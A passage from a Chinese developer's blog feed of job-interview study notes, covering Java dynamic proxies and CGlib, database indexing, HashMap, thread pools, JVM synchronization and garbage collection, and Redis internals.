class="line">        </span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    ProxyUtil(Object target)&#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getTarget</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTarget</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>测试实现<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Object proxyedObject = <span class="keyword">new</span> UserServiceImpl();    <span class="comment">// 被代理的对象</span></span><br><span class="line">        ProxyUtil proxyUtils = <span class="keyword">new</span> ProxyUtil(proxyedObject);</span><br><span class="line">        <span class="comment">// 生成代理对象，对被代理对象的这些接口进行代理：UserServiceImpl.class.getInterfaces()</span></span><br><span class="line">        UserService proxyObject = (UserService) Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), </span><br><span class="line">                    UserServiceImpl.class.getInterfaces(), proxyUtils);</span><br><span class="line">        proxyObject.getUser(<span class="number">1</span>);</span><br><span class="line">        proxyObject.addUser(<span class="keyword">new</span> User());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>核心则在于被代理的对象必须要有含有自己方法的接口，才可以使用Proxy+InvocationHandler，同时，代理类中主要是通过调用被重写的invoke（）方法。</p></blockquote><h5 id="CGlib"><a href="#CGlib" class="headerlink" title="CGlib"></a>CGlib</h5><p>Cglib代理的实现<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CGProxy</span> <span class="keyword">implements</span> <span class="title">MethodInterceptor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;    <span class="comment">// 被代理对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CGProxy</span><span class="params">(Object target)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">intercept</span><span class="params">(Object arg0, Method arg1, Object[] arg2, MethodProxy proxy)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"do sth before...."</span>);</span><br><span class="line">        Object result = proxy.invokeSuper(arg0, arg2);</span><br><span class="line">        System.out.println(<span class="string">"do sth after...."</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getProxyObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Enhancer enhancer = <span class="keyword">new</span> Enhancer();</span><br><span class="line">        enhancer.setSuperclass(<span class="keyword">this</span>.target.getClass());    <span class="comment">// 设置父类</span></span><br><span class="line">        <span class="comment">// 设置回调</span></span><br><span class="line">        enhancer.setCallback(<span class="keyword">this</span>);    <span class="comment">// 在调用父类方法时，回调 this.intercept()</span></span><br><span class="line">        <span class="comment">// 创建代理对象</span></span><br><span class="line">        <span class="keyword">return</span> enhancer.create();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>测试结果<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CGProxyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Object proxyedObject = <span class="keyword">new</span> UserServiceImpl();    <span class="comment">// 被代理的对象</span></span><br><span class="line">        CGProxy cgProxy = <span class="keyword">new</span> CGProxy(proxyedObject);</span><br><span class="line">        UserService proxyObject = (UserService) cgProxy.getProxyObject();</span><br><span class="line">        proxyObject.getUser(<span class="number">1</span>);</span><br><span class="line">        proxyObject.addUser(<span class="keyword">new</span> User());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>与Proxy+InvocationHandler不同，Cglib是利用enhancer.create创造了一个代理对象，而这个大力对象的父类就是被代理类，利用enhancer.setSuperclass()指定，同时利用enhancer.setCallback()回调被重写的intercept，完成对方法的包裹</p></blockquote><h2 id="数据库索引"><a href="#数据库索引" class="headerlink" title="数据库索引"></a>数据库索引</h2><h3 id="聚合索引-和-非聚合索引"><a href="#聚合索引-和-非聚合索引" class="headerlink" title="聚合索引 和 非聚合索引"></a>聚合索引 和 非聚合索引</h3><blockquote><p>聚合索引是 数据行的物理顺序与列值（一般是主键的那一列）的逻辑顺序相同，一个表中只能拥有一个聚集索引。<br>非聚合索引是 该索引中索引的逻辑顺序与磁盘上行的物理存储顺序不同，一个表中可以拥有多个非聚集索引<br>言外之意，索引是有序的，如果存储数据和索引一样有序就是聚合索引，非聚合索引就是数据不是和索引本身一样有序</p></blockquote><h3 id="聚簇索引和非聚簇索引"><a href="#聚簇索引和非聚簇索引" class="headerlink" title="聚簇索引和非聚簇索引"></a>聚簇索引和非聚簇索引</h3><blockquote><p>数据和索引放在一起就是聚簇索引<br>地址和索引在一起，数据是通过地址再关联在一起是非聚簇索引</p></blockquote><h3 id="主索引，辅助索引"><a href="#主索引，辅助索引" class="headerlink" title="主索引，辅助索引"></a>主索引，辅助索引</h3><h3 id="聚合索引状态下"><a href="#聚合索引状态下" class="headerlink" title="聚合索引状态下"></a>聚合索引状态下</h3><blockquote><p>就是根据主键值建立的索引就是主索引<br>辅助索引又叫二级索引，他的索引存主键的值</p></blockquote><h3 id="非聚合索引状态下"><a href="#非聚合索引状态下" class="headerlink" title="非聚合索引状态下"></a>非聚合索引状态下</h3><blockquote><p>非聚簇索引的主索引和辅助索引的叶子节点的data都是存储的数据的物理地址，也就是说索引和数据并不是存储在一起的，数据的顺序和索引的顺序并没有任何关系，也就是索引顺序与数据物理排列顺序无关。</p></blockquote><h3 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h3><h4 id="插入缓存"><a href="#插入缓存" class="headerlink" title="插入缓存"></a>插入缓存</h4><ol><li>正常情况下正常的插入速度很快</li><li>但是如果使用UUID的话，需要离散的先访问非聚集索引索引页，判断非索引也是否在缓冲池中，若在，则直接插入，若没在则放入Insert Buffer中，在Insert Buffer 中合并后插入到索引页，提高了插入性能<h3 id="索引失效问题"><a href="#索引失效问题" class="headerlink" title="索引失效问题"></a>索引失效问题</h3></li></ol><h4 id="组合索引"><a href="#组合索引" class="headerlink" title="组合索引"></a>组合索引</h4><blockquote><p>如果组合索引是abc那么用where a或者where a，b 或者where abc都可以，但是如果用 where b这样子的跳跃会导致索引失效</p></blockquote><h4 id="前导模糊系列"><a href="#前导模糊系列" class="headerlink" title="前导模糊系列"></a>前导模糊系列</h4><blockquote><p>例：(like ‘%XX’或者like ‘%XX%’)</p></blockquote><h4 id="or失效"><a href="#or失效" class="headerlink" title="or失效"></a>or失效</h4><blockquote><p>使用 or 的时候会导致索引失效，可以改用union</p></blockquote><h4 id="判断null"><a href="#判断null" class="headerlink" title="判断null"></a>判断null</h4><blockquote><p>索引是b+树的排序结构，如果是null的话，导致节点不知道应该放在哪里</p></blockquote><h4 id="where-子句中使用-或-lt-gt-操作符"><a href="#where-子句中使用-或-lt-gt-操作符" class="headerlink" title="where 子句中使用!=或&lt;&gt;操作符"></a>where 子句中使用!=或&lt;&gt;操作符</h4><h4 id="in-和-not-in-也要慎用，"><a href="#in-和-not-in-也要慎用，" class="headerlink" title="in 和 not in 也要慎用，"></a>in 和 not in 也要慎用，</h4><blockquote><p>select id from t where num in(1,2,3)</p></blockquote><h3 id="三范式"><a href="#三范式" class="headerlink" title="三范式"></a>三范式</h3><p><a href="https://blog.csdn.net/qq_43079376/article/details/93647335" target="_blank" rel="noopener">原文博客</a></p><h4 id="属性原子性"><a href="#属性原子性" class="headerlink" title="属性原子性"></a>属性原子性</h4><h4 id="行可以唯一识别性"><a href="#行可以唯一识别性" class="headerlink" title="行可以唯一识别性"></a>行可以唯一识别性</h4><h4 id="数据信息不冲突"><a href="#数据信息不冲突" class="headerlink" title="数据信息不冲突"></a>数据信息不冲突</h4><h3 id="BCNF"><a href="#BCNF" class="headerlink" title="BCNF"></a>BCNF</h3><ol><li>非主属性依赖主属性</li><li>主属性也要依赖其它的非主属性</li><li>非主属性不能被依赖<h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><h3 id="HashMap根据hashcode查找到对应位置的方法"><a href="#HashMap根据hashcode查找到对应位置的方法" class="headerlink" title="HashMap根据hashcode查找到对应位置的方法"></a>HashMap根据hashcode查找到对应位置的方法</h3><a href="https://blog.csdn.net/v123411739/article/details/78996181" target="_blank" rel="noopener">原帖地址</a></li><li>拿到 key 的 hashCode 值</li><li>将 hashCode 的高位参与运算，重新计算 hash 值</li><li>将计算出来的 hash 值与 (table.length - 1) 进行 &amp; 运算<h3 id="原因解释如下"><a href="#原因解释如下" class="headerlink" title="原因解释如下"></a>原因解释如下</h3><blockquote><p>首先拿到key的hashcode值，如果是并利用  hashcode ^ table.length  (table.length是2次幂)得到hash值，如果是与运算的话，假如table是初始化的16位，那么高位是无法进行运算的，结果值也就是被hashcode值的后四位所决定<br>之后用hash值 进行 hash &amp; (table.length)</p></blockquote><h2 id="线程池的拒绝策略"><a href="#线程池的拒绝策略" class="headerlink" title="线程池的拒绝策略"></a>线程池的拒绝策略</h2><h3 id="CallerRunsPolicy"><a href="#CallerRunsPolicy" class="headerlink" title="CallerRunsPolicy"></a>CallerRunsPolicy</h3>满了以后用调用线程池的线程去执行他<h3 id="DiscardPolicy"><a href="#DiscardPolicy" class="headerlink" title="DiscardPolicy"></a>DiscardPolicy</h3>直接拒绝，啥也不干<h3 id="AbortPolicy"><a href="#AbortPolicy" class="headerlink" title="AbortPolicy"></a>AbortPolicy</h3>报个错，然后直接拒绝，啥也不干<h3 id="DiscardOldestPolicy"><a href="#DiscardOldestPolicy" class="headerlink" title="DiscardOldestPolicy"></a>DiscardOldestPolicy</h3>抛出最先加入使用的线程</li></ol></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;2020-03-18 蘑菇街一面 是凉凉了 但是很高兴的是面试官真的很耐心 自己也发现了很多的问题和不足&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>《天净沙·我·被字节血洗篇》  双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？</title>
    <link href="http://runindark.com/2020/03/16/2020%E6%98%A5%E6%8B%9B/%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C-%E5%AD%97%E8%8A%82%E8%A1%80%E6%B4%97/"/>
    <id>http://runindark.com/2020/03/16/2020春招/我为阿里-字节血洗/</id>
    <published>2020-03-16T13:15:03.321Z</published>
    <updated>2020-06-28T01:43:26.137Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>别问 问就是为了面试豁出了老命<br>总结了3.15日字节面试的一些问题，鲜血淋漓篇<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h2 id="高并发-为什么Synchronized可以保证线程的安全？"><a href="#高并发-为什么Synchronized可以保证线程的安全？" class="headerlink" title="高并发 - 为什么Synchronized可以保证线程的安全？"></a>高并发 - 为什么Synchronized可以保证线程的安全？</h2><p><a href="https://www.jianshu.com/p/7ddb0956590c" target="_blank" rel="noopener">博客参考</a></p><blockquote><p>JVM中对于同步方法和同步代码块是不一样的，本质上都有monitor对象，但是同步方法使用了monitorentre/monitorexit，而同步代码块则使用了ACC_SYNCHRONIZED标志（隐式）</p></blockquote><h3 id="对象头"><a href="#对象头" class="headerlink" title="对象头"></a>对象头</h3><blockquote><p>Java中在JVM的处理上，每一个对象都会有一个对象头，monitor 存在于对象头的Mark Word 中(存储monitor引用指针)</p></blockquote><h3 id="Jvm对同步方法的处理（monitorenter-monitorexit）"><a href="#Jvm对同步方法的处理（monitorenter-monitorexit）" class="headerlink" title="Jvm对同步方法的处理（monitorenter/monitorexit）"></a>Jvm对同步方法的处理（monitorenter/monitorexit）</h3><h4 id="monitorenter"><a href="#monitorenter" class="headerlink" title="monitorenter"></a>monitorenter</h4><blockquote><ol><li>首先一个对象要有自己的monitor，当对象的monitor被占用的时候，则monitor被锁定，之后当一个线程需要获取该对象的时候，则需要调用monitorexit指令，首先要判断monitor的进入数，如果进入数为0，那么monitorenter进入成功，线程进入monitor，然后将进入数设为1，该线程则成为monitor的所有者。</li><li>如果线程已经占有了monitor，只是重新进入，那么monitor的进入数+1</li><li>如果其它线程在monitor被占领的时候来获取monitor那么，该线程则自动进入到阻塞状态，知道monitor的进入数为0，再重新尝试获取monitor的权限</li></ol></blockquote><h3 id="monitorexit"><a href="#monitorexit" class="headerlink" title="monitorexit"></a>monitorexit</h3><blockquote><ol><li>执行monitorexit必须是该对象monitor的所有者</li><li>monitorexit执行成功的时候，则monitor的进入数-1</li></ol></blockquote><h3 id="Jvm对同步代码块的处理（ACC-SYNCHRONIZED）"><a href="#Jvm对同步代码块的处理（ACC-SYNCHRONIZED）" class="headerlink" title="Jvm对同步代码块的处理（ACC_SYNCHRONIZED）"></a>Jvm对同步代码块的处理（ACC_SYNCHRONIZED）</h3><blockquote><ol><li>对于同步代码块，其常量池多了ACC_SYNCHRONIZED标志，也是flag的地方多了ACC_SYNCHRONIZED</li><li>同步代码块被调用的时候，JVM会调用指令去检查ACC_SYNCHRONIZED是否被设置，如果设置了则获取monitor，获取成功后则执行代码块中的内容，执行期间其它的线程将无法再获得monitor</li></ol></blockquote><h3 id="wait-notify-notifyall"><a href="#wait-notify-notifyall" class="headerlink" title="wait/notify/notifyall"></a>wait/notify/notifyall</h3><blockquote><ol><li>wait/notify等方法也依赖于monitor对象，这就是为什么只有在同步的块或者方法中才能调用wait/notify等方法，否则会抛出java.lang.IllegalMonitorStateException的异常的原因</li><li>要特别理解的一点是，与sleep方法不同的是wait方法调用完成后，线程将被暂停，但wait方法将会释放当前持有的监视器锁(monitor)，直到有线程调用notify/notifyAll方法后方能继续执行，而sleep方法只让线程休眠并不释放锁。同时notify/notifyAll方法调用后，并不会马上释放监视器锁，而是在相应的synchronized(){}/synchronized方法执行结束后才自动释放锁</li></ol></blockquote><h3 id="Interrupt"><a href="#Interrupt" class="headerlink" title="Interrupt"></a>Interrupt</h3><ol><li>//中断线程（实例方法）<br>public void Thread.interrupt();</li><li>//判断线程是否被中断（实例方法）<br>public boolean Thread.isInterrupted();</li><li>//判断是否被中断并清除当前中断状态（静态方法）<br>public static boolean Thread.interrupted();</li></ol><h3 id="Interrupt的作用"><a href="#Interrupt的作用" class="headerlink" title="Interrupt的作用"></a>Interrupt的作用</h3><blockquote><p>可以直接中断阻塞的线程，但是<strong>无法阻塞获取锁或者拿到锁的线程</strong></p></blockquote><h2 id="JVM-private-final-a-1-请问他的创建的过程？"><a href="#JVM-private-final-a-1-请问他的创建的过程？" class="headerlink" title="JVM - private final a = 1; 请问他的创建的过程？"></a>JVM - private final a = 1; 请问他的创建的过程？</h2><h3 id="答："><a href="#答：" class="headerlink" title="答："></a>答：</h3><ol><li>加载</li><li>验证</li><li>准备<blockquote><p>在准备阶段就直接将将值进行替换，不占用内存空间</p></blockquote></li><li>解析</li><li>初始化</li></ol><h3 id="深入："><a href="#深入：" class="headerlink" title="深入："></a>深入：</h3><blockquote><p>static 静态变量在正常情况下是 在准备阶段在方法区分配空间，但是直到最后的初始化阶段才正确的赋值<br>例： public static int value = 5<br>在准备阶段  value 已在方法区获得空间,但是值为0<br>在最后的初始化阶段才真正的编程 5 </p></blockquote><h3 id="加载，验证阶段的内容补充"><a href="#加载，验证阶段的内容补充" class="headerlink" title="加载，验证阶段的内容补充"></a>加载，验证阶段的内容补充</h3><h4 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h4><blockquote><p>在加载阶段（可以参考java.lang.ClassLoader的loadClass()方法），虚拟机需要完成以下3件事情： </p><ol><li>通过一个类的全限定名来获取定义此类的二进制字节流（并没有指明要从一个Class文件中获取，可以从其他渠道，譬如：网络、动态生成、数据库等）； </li></ol></blockquote><blockquote><ol start="2"><li>将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构； </li></ol></blockquote><blockquote><ol start="3"><li>在内存中生成一个代表这个类的java.lang.Class对象，作为方法区这个类的各种数据的访问入口； </li></ol></blockquote><blockquote><p>加载阶段和连接阶段（Linking）的部分内容（如一部分字节码文件格式验证动作）是交叉进行的，加载阶段尚未完成，连接阶段可能已经开始，但这些夹在加载阶段之中进行的动作，仍然属于连接阶段的内容，这两个阶段的开始时间仍然保持着固定的先后顺序。 </p></blockquote><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><blockquote><p>验证是连接阶段的第一步，这一阶段的目的是为了确保Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。<br>验证阶段大致会完成4个阶段的检验动作： </p></blockquote><blockquote><ol><li>文件格式验证：验证字节流是否符合Class文件格式的规范；例如：是否以魔术0xCAFEBABE开头、主次版本号是否在当前虚拟机的处理范围之内、常量池中的常量是否有不被支持的类型。 </li></ol></blockquote><blockquote><ol start="2"><li>元数据验证：对字节码描述的信息进行语义分析（注意：对比javac编译阶段的语义分析），以保证其描述的信息符合Java语言规范的要求；例如：这个类是否有父类，除了java.lang.Object之外。 </li></ol></blockquote><blockquote><ol start="3"><li>字节码验证：通过数据流和控制流分析，确定程序语义是合法的、符合逻辑的。 </li></ol></blockquote><blockquote><ol start="4"><li>符号引用验证：确保解析动作能正确执行。 </li></ol></blockquote><p>验证阶段是非常重要的，但不是必须的，它对程序运行期没有影响，如果所引用的类经过反复验证，那么可以考虑采用-Xverifynone参数来关闭大部分的类验证措施，以缩短虚拟机类加载的时间</p><h2 id="JVM-GC回收的时候那些垃圾是怎么被标识的？"><a href="#JVM-GC回收的时候那些垃圾是怎么被标识的？" class="headerlink" title="JVM - GC回收的时候那些垃圾是怎么被标识的？"></a>JVM - GC回收的时候那些垃圾是怎么被标识的？</h2><h3 id="语义双关注意"><a href="#语义双关注意" class="headerlink" title="语义双关注意"></a>语义双关注意</h3><blockquote><p>可能面试官想问的是标记垃圾的方法（可达性分析和程序计数器法）<br>还可能是想问具体是怎么标记的？</p></blockquote><h3 id="相关的内容补充"><a href="#相关的内容补充" class="headerlink" title="相关的内容补充"></a>相关的内容补充</h3><h4 id="OopMap"><a href="#OopMap" class="headerlink" title="OopMap"></a>OopMap</h4><blockquote><p>垃圾回收的时候需要对栈上的内存进行扫描，判断哪些位置存在Reference类型，但是如果是直接查找的话，会产生遍历的问题，这样是慢的。<br>所以HotSpot用OopMap对Reference进行存储，这样子就可以用空间换时间，避免了全栈的扫描</p></blockquote><h4 id="三色标记"><a href="#三色标记" class="headerlink" title="三色标记"></a>三色标记</h4><p><strong>并发标记</strong></p><ol><li>黑色：根对象，或者该对象与它的子对象都被扫描过（对象被标记了，且它的所有field也被标记完了）。</li><li>灰色：对象本身被扫描，但还没扫描完该对象中的子对象（它的field还没有被标记或标记完）。</li><li>白色：未被扫描对象，扫描完成所有对象之后，最终为白色的为不可达对象，既垃圾对象（对象没有被标记到）。<h4 id="卡表"><a href="#卡表" class="headerlink" title="卡表"></a>卡表</h4>(RememberSet)[<a href="https://img-blog.csdn.net/20170705174843116?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveGZ6MDMzMA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center]" target="_blank" rel="noopener">https://img-blog.csdn.net/20170705174843116?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveGZ6MDMzMA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center]</a></li></ol><blockquote><p>以G1收集器为例，G1由于将内存空间分配成了Region，因此如果每个Region都去记录自己的对象引用了什么其它的对象，会造成很多不必要的开销，那么如果换个思维只记录自己的新生代被谁的老年代引用了就可以减小开销（因为新生代无论如何都是要被全部扫描的，记录不同Region新生代与新生代之间的引用是没有意义的，同时老年代很少，因此扫描老年代是不是引用其它新生代会更快），如果被记录的话，则直接假如到GcRoot中这样就可以避免一些不必要的扫描。<br>开始说卡表，每个Region被分成了若干个<strong>卡（Card）</strong>，这些<strong>Card</strong>都会记录在全局卡表中，<strong>Card</strong>中每个元素对应着内存区域中一个特定大小的内存块，这个内存块则被称之为<strong>卡页</strong>，一个卡页一般里面不只一个对象，所以卡页存在着跨Region引用，那么这样的元素的值标识为1。<br>这样在Minor GC时，只需要将变脏的Region(写屏障,这个事情是并发标记的时候完成的，直接加入到GcRoot可以提升效率)中的那个卡页加入GC Roots一并扫描即可。比起扫描老年代的所有对象，大大减少了扫描的数据量，提升了效率</p></blockquote><h2 id="TCP-的连接过程（从网络层去分析）"><a href="#TCP-的连接过程（从网络层去分析）" class="headerlink" title="TCP 的连接过程（从网络层去分析）"></a>TCP 的连接过程（从网络层去分析）</h2><blockquote><p>TCP三次握手 四次招手</p></blockquote><h2 id="口述TCP是如何保证数据传输的？"><a href="#口述TCP是如何保证数据传输的？" class="headerlink" title="口述TCP是如何保证数据传输的？"></a>口述TCP是如何保证数据传输的？</h2><h2 id="线程共享的部分"><a href="#线程共享的部分" class="headerlink" title="线程共享的部分"></a>线程共享的部分</h2><ul><li><p>堆  由于堆是在进程空间中开辟出来的，所以它是理所当然地被共享的；因此new出来的都是共享的（16位平台上分全局堆和局部堆，局部堆是独享的）</p></li><li><p>全局变量 它是与具体某一函数无关的，所以也与特定线程无关；因此也是共享的</p></li><li><p>静态变量 虽然对于局部变量来说，它在代码中是“放”在某一函数中的，但是其存放位置和全局变量一样，存于堆中开辟的.bss和.data段，是共享的</p></li><li><p>文件等公用资源  这个是共享的，使用这些公共资源的线程必须同步。Win32 提供了几种同步资源的方式，包括信号、临界区、事件和互斥体。</p></li></ul><h2 id="深入到操作系统线程之间什么什么是独享的资源"><a href="#深入到操作系统线程之间什么什么是独享的资源" class="headerlink" title="深入到操作系统线程之间什么什么是独享的资源"></a>深入到操作系统线程之间什么什么是独享的资源</h2><ul><li>栈 栈是独享的</li><li>寄存器<h2 id="请问只要是加了Synchronized就安全了吗？"><a href="#请问只要是加了Synchronized就安全了吗？" class="headerlink" title="请问只要是加了Synchronized就安全了吗？"></a>请问只要是加了Synchronized就安全了吗？</h2><blockquote><p>静态方法 和 实例方法  的区别</p></blockquote><h2 id="有关List集合的删改功能知道吗？"><a href="#有关List集合的删改功能知道吗？" class="headerlink" title="有关List集合的删改功能知道吗？"></a>有关List集合的删改功能知道吗？</h2><blockquote><p>就是利用System.copy的功能往前或者往后移动一位<br>扩容机制就是利用调用EnsureCapacityInternal()方法去调用grow函数，再使用Arrays.copyOf进行扩容</p></blockquote></li></ul><h2 id="Java-线程池的实现"><a href="#Java-线程池的实现" class="headerlink" title="Java 线程池的实现"></a>Java 线程池的实现</h2><h3 id="线程池的优点"><a href="#线程池的优点" class="headerlink" title="线程池的优点"></a>线程池的优点</h3><p><a href="https://baijiahao.baidu.com/s?id=1641469444994560637&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">原帖</a><br>线程池能够对线程进行统一分配，调优和监控：</p><ul><li>降低资源消耗（线程无限制地创建，然后使用完毕后销毁）</li><li>提高响应速度（无须创建线程）</li><li>提高线程的可管理性</li></ul><h3 id="线程的执行过程"><a href="#线程的执行过程" class="headerlink" title="线程的执行过程"></a>线程的执行过程</h3><ol><li>首先添加到核心线程池</li><li>核心线程池满以后，直接进入阻塞队列</li><li>阻塞队列满了以后判断最大核心数</li><li>如果未达到核心线程数目，则线程池进行扩容创建一个Worker执行提交任务，新建的Worker会被添加到线程集合workers中</li><li>如果超过maximumPoolSize会执行拒绝策略<h4 id="拒绝策略"><a href="#拒绝策略" class="headerlink" title="拒绝策略"></a>拒绝策略</h4></li><li>调用线程执行 ： 就是调用其它的线程</li><li>终止执行： 直接抛出RejectExecutionException异常</li><li>丢弃任务： 直接丢弃，不会抛异常</li><li>丢失老任务： 删除等待队列中最老的任务，然后重新执行</li></ol><h2 id="Mybatis缓存"><a href="#Mybatis缓存" class="headerlink" title="Mybatis缓存"></a>Mybatis缓存</h2></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;别问 问就是为了面试豁出了老命&lt;br&gt;总结了3.15日字节面试的一些问题，鲜血淋漓篇&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>《天净沙·我·Redis篇》  双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？</title>
    <link href="http://runindark.com/2020/03/14/2020%E6%98%A5%E6%8B%9B/%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C-Redis/"/>
    <id>http://runindark.com/2020/03/14/2020春招/我为阿里-Redis/</id>
    <published>2020-03-14T09:58:51.001Z</published>
    <updated>2020-06-28T01:43:26.138Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>别问 问就是为了面试豁出了老命<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h2 id="来来来，讲一讲为什么Redis这么快？"><a href="#来来来，讲一讲为什么Redis这么快？" class="headerlink" title="来来来，讲一讲为什么Redis这么快？"></a>来来来，讲一讲为什么Redis这么快？</h2><blockquote><p>首先，采用了多路复用io阻塞机制<br>然后，数据结构简单，操作节省时间<br>最后，运行在内存中，自然速度快</p></blockquote><h3 id="Redis为什么是单线程的？"><a href="#Redis为什么是单线程的？" class="headerlink" title="Redis为什么是单线程的？"></a>Redis为什么是单线程的？</h3><blockquote><p>Redis的瓶颈不是cpu的运行速度，而往往是网络带宽和机器的内存大小。再说了，单线程切换开销小，容易实现既然单线程容易实现，而且CPU不会成为瓶颈，那就顺理成章地采用单线程的方案了</p></blockquote><h3 id="如果万一CPU成为你的Redis瓶颈了，或者，你就是不想让服务器其他核闲置，那怎么办"><a href="#如果万一CPU成为你的Redis瓶颈了，或者，你就是不想让服务器其他核闲置，那怎么办" class="headerlink" title="如果万一CPU成为你的Redis瓶颈了，或者，你就是不想让服务器其他核闲置，那怎么办"></a>如果万一CPU成为你的Redis瓶颈了，或者，你就是不想让服务器其他核闲置，那怎么办</h3><blockquote><p>多起几个Redis进程就好了。Redis是keyvalue数据库，又不是关系数据库，数据之间没有约束。只要客户端分清哪些key放在哪个Redis进程上就可以了。redis-cluster可以帮你做的更好</p></blockquote><h3 id="我们使用单线程的方式是无法发挥多核CPU-性能，有什么办法发挥多核CPU的性能嘛？"><a href="#我们使用单线程的方式是无法发挥多核CPU-性能，有什么办法发挥多核CPU的性能嘛？" class="headerlink" title="我们使用单线程的方式是无法发挥多核CPU 性能，有什么办法发挥多核CPU的性能嘛？"></a>我们使用单线程的方式是无法发挥多核CPU 性能，有什么办法发挥多核CPU的性能嘛？</h3><blockquote><p>我们可以通过在单机开多个Redis</p></blockquote><h2 id="简述一下Redis值的五种类型"><a href="#简述一下Redis值的五种类型" class="headerlink" title="简述一下Redis值的五种类型"></a>简述一下Redis值的五种类型</h2><ul><li>String 整数，浮点数或者字符串</li><li>Set 集合</li><li>Zset 有序集合</li><li>Hash 散列表</li><li>List 列表</li></ul><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><p>数据结构 =&gt; SDS<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span> ((__<span class="title">packed__</span>)) <span class="title">sdshdr32</span> &#123;</span></span><br><span class="line">    <span 